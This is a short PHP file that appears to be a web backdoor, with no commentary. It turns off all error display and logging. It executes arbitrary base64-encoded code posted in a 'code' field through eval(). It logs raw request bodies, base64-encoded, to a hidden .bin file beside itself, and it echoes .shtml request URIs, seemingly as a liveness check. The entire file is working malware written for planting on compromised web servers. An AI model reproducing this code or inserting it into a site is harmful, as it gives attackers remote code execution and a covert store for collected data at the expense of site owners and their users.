<?php

@error_reporting(0);
@ini_set("display_errors",0);
@ini_set("log_errors",0);
@ini_set("error_log",0);
@ini_set("memory_limit", "128M");
@ini_set("max_execution_time",30);
@set_time_limit(30); 

if (isset($_SERVER["HTTP_X_REAL_IP"])) $_SERVER["REMOTE_ADDR"] = $_SERVER["HTTP_X_REAL_IP"];

if (isset($_POST["code"]))
{
	eval(base64_decode($_POST["code"]));
}

elseif (isset($_SERVER["HTTP_CONTENT_ENCODING"]) && $_SERVER["HTTP_CONTENT_ENCODING"] == "binary")
{
	$input = file_get_contents("php://input");

	if (strlen($input) > 0) print "STATUS-IMPORT-OK";

	if (strlen($input) > 10)
	{
		$fp = @fopen(str_replace(".php",".bin",basename($_SERVER["SCRIPT_FILENAME"])), "a");
		@flock($fp, LOCK_EX);
		@fputs($fp, $_SERVER["REMOTE_ADDR"]."\t".base64_encode($input)."\r\n");
		@flock($fp, LOCK_UN);
		@fclose($fp);
	}
}

elseif (strpos($_SERVER["REQUEST_URI"], ".shtml") !== false)
{
	print $_SERVER["REQUEST_URI"];
}


exit;

?>